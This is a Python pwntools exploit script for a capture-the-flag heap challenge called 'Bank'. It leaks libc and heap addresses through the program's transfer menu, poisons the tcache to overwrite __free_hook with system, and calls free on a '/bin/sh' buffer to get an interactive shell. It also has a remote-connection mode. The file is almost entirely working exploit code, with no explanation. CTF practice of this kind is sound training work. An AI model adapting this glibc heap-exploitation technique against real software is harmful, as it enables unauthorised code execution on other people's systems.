# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './Bank'
os.system('chmod +x %s'%binary)
context.update( os = 'linux', arch = 'amd64',timeout = 1)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def login():
    cmd('Login\x00')
    sla('Numbers:' , 114514)
    sla('Password:' , 1145141919)

def info():
    cmd('Info\x00')

def put(size):
    cmd('Put\x00')
    sla('Much?' , size)

def get(size):
    cmd('Deposit\x00')
    sla('Much?' , size)

def add( text = 'a'):
    cmd('Transfer\x00')
    sla('who?' , 'guest\x00')
    sla('How much?' , 0x6)
    sa('data: ' , text)

def alloc(size ):
    cmd('Transfer\x00')
    sla('who?' , 'ghost\x00')
    sla('How much?' , 0xb)
    sla(' :)' , size)

def leak(idx ):
    cmd('Transfer\x00')
    sla('who?' , 'admin\x00')
    sla('How much?' , idx)

def delete(num ):
    cmd('Transfer\x00')
    sla('who?' , 'hacker\x00')
    sla('How much?' , 0x33)
    sla('Great!' ,num)

# one_gad = one_gadget(libc.path)

def attack():
    
    login()

    put(0x190)
    for i in range(7):
        get(0x190*(2**i))
        put(0x190*(2**i))


    info()
    for i in range(9):
        alloc(0x100)
        alloc(0xe0)

    leak(0xf2)
    ru('0x')
    __malloc_hook = rint() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    leak(0x45 )
    ru('0x')
    heap_addr = rint()
    heap_base = heap_addr - 0x10
    delete(heap_base + 0xb20)

    for i in range(7):
        add()

    add(p64(__free_hook-8))
    add()
    add()
    add(flat('/bin/sh\x00' , system_addr))
    delete(__free_hook-8)

    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   Bank.py
@Time    :   2022/07/09 11:25:59
@Author  :   Niyah 
'''